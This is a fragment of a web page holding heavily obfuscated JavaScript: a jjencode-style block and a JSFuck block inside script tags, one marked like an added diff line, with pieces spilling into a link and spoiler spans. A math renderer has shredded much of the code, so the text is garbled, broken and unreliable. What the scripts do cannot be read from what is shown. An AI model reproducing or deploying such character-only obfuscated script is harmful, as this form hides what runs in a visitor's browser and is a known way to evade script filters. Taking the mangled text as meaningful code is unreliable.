xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>:</mo><mo>+</mo><mo>+</mo></mrow><annotation encoding="application/x-tex">:++</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord">+</span></span></span></span>,$$<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mo>:</mo></msub><mo stretchy="false">(</mo><mo stretchy="false">!</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">_:(!&quot;&quot;+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">:</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mclose">!</span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>],__:++,_:<ins><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span>__:({}+"")[],$$_:</ins><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span>$$:<ins><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span>___:</ins><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3em;vertical-align:-0.19444em;"></span><span class="mpunct">,</span></span></span></span><strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>:</mo><mo>+</mo><mo>+</mo></mrow><annotation encoding="application/x-tex">:++</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord">+</span></span></span></span>};<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><em>=(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span></em>=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>._]+(._=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>_[.__])+(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">=(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>.<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>.</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">])+((!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">!</span></span></span></span>)+&quot;&quot;)[._<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">]</mo><mo>+</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">]+(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>.<strong>=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>_[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mo stretchy="false">]</mo></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">_])+(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mclose mtight">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>.<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">!</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">=(!&quot;&quot;+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mclose">!</span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>.</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">])+(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>.<em>=(!&quot;&quot;+&quot;&quot;)[._</em>])+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><em>[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span></em><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">]</mo><mo>+</mo></mrow><annotation encoding="application/x-tex">]+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mord">+</span></span></span></span>.<strong>+._+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo></mrow><annotation encoding="application/x-tex">=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span>.<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>+</mo><mo stretchy="false">(</mo><mo stretchy="false">!</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo>+</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">)</mo><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">+(!&quot;&quot;+&quot;&quot;)[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mopen">(</span><span class="mclose">!</span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mopen">[</span></span></span></span>.<em>$$]+.__+.</em>+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mpunct">;</span></span></span></span>.<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">=(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>.</strong><em>)[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span></em>][<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><em>];<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>+"\""+._</em>+(![]+&quot;&quot;)[._<em>]+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span>$$</em>+&quot;\&quot;+.__+<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mo>+</mo></msub></mrow><annotation encoding="application/x-tex">_+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.466662em;vertical-align:-0.208331em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>.<em><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mo>+</mo></msub></mrow><annotation encoding="application/x-tex">_+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.466662em;vertical-align:-0.208331em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>.<strong>+&quot;(&quot;+$.</strong></em>+&quot;)&quot;+&quot;&quot;&quot;)())();&lt;/script&gt;<br />
+&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(<span class="spoiler" title="你知道得太多了">[]+[])[+[]]+(</span>[]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(<span class="spoiler" title="你知道得太多了">[]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(</span>[]+[])[+!+[]]]<a href="(!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B%5D%5B(%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(%5B%5D%5B%5B%5D%5D+%5B%5D)%5B+!+%5B%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D+(%5B%5D%5B%5B%5D%5D+%5B%5D)%5B+%5B%5D%5D+(%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B%5B+!+%5B%5D%5D+%5B!+%5B%5D+!+%5B%5D+!+%5B%5D+!+%5B%5D%5D%5D+%5B+%5B%5D%5D+(%5B%5D%5B(%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(%5B%5D%5B%5B%5D%5D+%5B%5D)%5B+!+%5B%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D+(%5B%5D%5B%5B%5D%5D+%5B%5D)%5B+%5B%5D%5D+(%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D%5B(!%5B%5D+%5B%5D)%5B+%5B%5D%5D+(%5B!%5B%5D%5D+%5B%5D%5B%5B%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B!+%5B%5D+!+%5B%5D+!+%5B%5D%5D+(!+%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D)%5B+!+%5B%5D+%5B+%5B%5D%5D%5D+(!!%5B%5D+%5B%5D)%5B+!+%5B%5D%5D%5D+%5B%5D)%5B%5B+!+%5B%5D%5D+%5B!+%5B%5D+!+%5B%5D+!+%5B%5D+!+%5B%5D+!+%5B%5D%5D%5D">([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(<span class="spoiler" 